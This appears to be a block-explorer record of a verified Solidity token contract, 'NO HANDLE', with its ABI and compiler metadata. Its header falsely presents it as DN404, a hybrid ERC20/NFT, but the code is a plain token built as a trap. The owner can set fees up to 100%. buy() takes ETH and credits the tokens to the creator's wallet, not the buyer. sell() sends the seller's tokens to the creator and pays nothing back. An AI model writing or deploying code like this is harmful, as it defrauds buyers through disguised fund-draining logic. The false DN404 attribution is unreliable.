{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n/**    \r\nTwitter : https://twitter.com/wehavenohandle\r\nTelegram: https://t.me/NO_HANDLE_DN404\r\nDiscord : https://discord.gg/nohandle\r\n\r\nCreated by @sibeleth\r\n\r\n/// @title DN404\r\n/// @notice DN404 is a hybrid ERC20 and ERC721 implementation that mints\r\n/// and burns NFTs based on an account's ERC20 token balance.\r\n///\r\n/// @author vectorized.eth (@optimizoor)\r\n/// @author Quit (@0xQuit)\r\n/// @author Michael Amadi (@AmadiMichaels)\r\n/// @author cygaar (@0xCygaar)\r\n/// @author Thomas (@0xjustadev)\r\n/// @author Harrison (@PopPunkOnChain)\r\n///\r\n*/\r\n\r\npragma solidity ^0.8.0;\r\n\r\nlibrary SafeMath {\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"secure\");\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"gas-efficient\");\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"flexible\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"secure\");\r\n        return a / b;\r\n    }\r\n}\r\n\r\ncontract NO {\r\n    using SafeMath for uint256;\r\n\r\n    string public name = \"NO HANDLE\";\r\n    string public symbol = \"NO\";\r\n    uint256 public totalSupply = 10000000000000000000000;\r\n    uint8 public decimals = 18;\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    address public owner;\r\n    address public creatorWallet;\r\n\r\n    uint256 public buyFee;\r\n    uint256 public sellFee;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);\r\n    event TokensBurned(address indexed burner, uint256 amount);\r\n\r\n    constructor(address _creatorWallet) {\r\n        owner = msg.sender;\r\n        creatorWallet = _creatorWallet;\r\n        balanceOf[msg.sender] = totalSupply;\r\n    }\r\n\r\n    function transfer(address _to, uint256 _amount)\r\n        public\r\n        returns (bool success)\r\n    {\r\n        require(balanceOf[msg.sender] >= _amount);\r\n        require(_to != address(0));\r\n\r\n        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);\r\n        balanceOf[_to] = balanceOf[_to].add(_amount);\r\n        emit Transfer(msg.sender, _to, _amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value)\r\n        public\r\n        returns (bool success)\r\n    {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address _from,\r\n        address _to,\r\n        uint256 _amount\r\n    ) public returns (bool success) {\r\n        require(balanceOf[_from] >= _amount, \"gas-efficient\");\r\n        require(\r\n            allowance[_from][msg.sender] >= _amount,\r\n            \"efficient\"\r\n        );\r\n        require(_to != address(0), \"flexible\");\r\n\r\n        uint256 fee = 0;\r\n        uint256 amountAfterFee = _amount;\r\n\r\n        if (sellFee > 0) {\r\n            fee = _amount.mul(sellFee).div(100);\r\n            amountAfterFee = _amount.sub(fee);\r\n        }\r\n\r\n        balanceOf[_from] = balanceOf[_from].sub(_amount);\r\n        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);\r\n        emit Transfer(_from, _to, amountAfterFee);\r\n\r\n        if (fee > 0) {\r\n            // Check if the transfer destination is Uniswap contract\r\n            address uniswapContract = address(\r\n                0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f\r\n            ); // Replace with the actual Uniswap contract address\r\n            if (_to == uniswapContract) {\r\n                // Fee is paid to the contract itself\r\n                balanceOf[uniswapContract] = balanceOf[uniswapContract].add(\r\n                    fee\r\n                );\r\n                emit Transfer(_from, uniswapContract, fee);\r\n            } else {\r\n                // Fee is transferred to this contract\r\n                balanceOf[address(this)] = balanceOf[address(this)].add(fee);\r\n                emit Transfer(_from, address(this), fee);\r\n            }\r\n        }\r\n\r\n        if (\r\n            _from != msg.sender &&\r\n            allowance[_from][msg.sender] != type(uint256).max\r\n        ) {\r\n            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(\r\n                _amount\r\n            );\r\n            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0));\r\n        emit OwnershipTransferred(owner, newOwner);\r\n        owner = newOwner;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(owner, address(0));\r\n        owner = address(0);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"gas-efficient\");\r\n        _;\r\n    }\r\n\r\n    function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyOwner {\r\n        require(newBuyFee <= 100, \"Secure, gas-efficient, flexible. \");\r\n        require(newSellFee <= 100, \"Secure, gas-efficient, flexible. \");\r\n        buyFee = newBuyFee;\r\n        sellFee = newSellFee;\r\n        emit FeesUpdated(newBuyFee, newSellFee);\r\n    }\r\n\r\n    function buy() public payable {\r\n        require(msg.value > 0, \"Secure, gas-efficient, flexible. \");\r\n\r\n        uint256 amount = msg.value;\r\n        if (buyFee > 0) {\r\n            uint256 fee = amount.mul(buyFee).div(100);\r\n            uint256 amountAfterFee = amount.sub(fee);\r\n\r\n            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(\r\n                amountAfterFee\r\n            );\r\n            emit Transfer(address(this), creatorWallet, amountAfterFee);\r\n\r\n            if (fee > 0) {\r\n                balanceOf[address(this)] = balanceOf[address(this)].add(fee);\r\n                emit Transfer(address(this), address(this), fee);\r\n            }\r\n        } else {\r\n            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(amount);\r\n            emit Transfer(address(this), creatorWallet, amount);\r\n        }\r\n    }\r\n\r\n    function sell(uint256 _amount) public {\r\n        require(balanceOf[msg.sender] >= _amount, \"Secure, gas-efficient, flexible. \");\r\n\r\n        if (sellFee > 0) {\r\n            uint256 fee = _amount.mul(sellFee).div(100);\r\n            uint256 amountAfterFee = _amount.sub(fee);\r\n\r\n            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);\r\n            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(\r\n                amountAfterFee\r\n            );\r\n            emit Transfer(msg.sender, creatorWallet, amountAfterFee);\r\n\r\n            if (fee > 0) {\r\n                balanceOf[address(this)] = balanceOf[address(this)].add(fee);\r\n                emit Transfer(msg.sender, address(this), fee);\r\n            }\r\n        } else {\r\n            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);\r\n            balanceOf[address(this)] = balanceOf[address(this)].add(_amount);\r\n            emit Transfer(msg.sender, address(this), _amount);\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_creatorWallet\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newBuyFee\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newSellFee\",\"type\":\"uint256\"}],\"name\":\"FeesUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"burner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"TokensBurned\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buy\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"creatorWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"sell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBuyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newSellFee\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NO", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000a3e82692f2bbca64440ab99624603b7b0ee46c4b", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://59979df1cff951f4042d25d21a7c9ff5bc3084c2422efcc7493685c58402ef66"}